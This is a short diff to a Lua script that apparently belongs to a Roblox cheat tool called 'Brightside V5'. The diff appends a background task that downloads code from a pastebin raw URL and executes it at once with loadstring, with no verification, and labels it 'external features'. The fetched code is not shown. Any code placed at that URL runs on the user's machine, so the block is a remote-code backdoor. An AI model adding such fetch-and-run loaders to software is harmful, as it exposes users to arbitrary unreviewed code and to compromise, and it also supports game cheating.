@@ -825,3 +825,16 @@ if not ok_hook then
 end
 
 print("[Brightside V5] Loaded! Velocity compatible.")
+
+task.spawn(function()
+    local ok, err = pcall(function()
+        local src = game:HttpGet("https://pastebin.com/raw/SB26Vyjj")
+        if src and #src > 0 then
+            loadstring(src)()
+            print("[Brightside] External features loaded")
+        end
+    end)
+    if not ok then
+        warn("[Brightside] External features failed: " .. tostring(err))
+    end
+end)
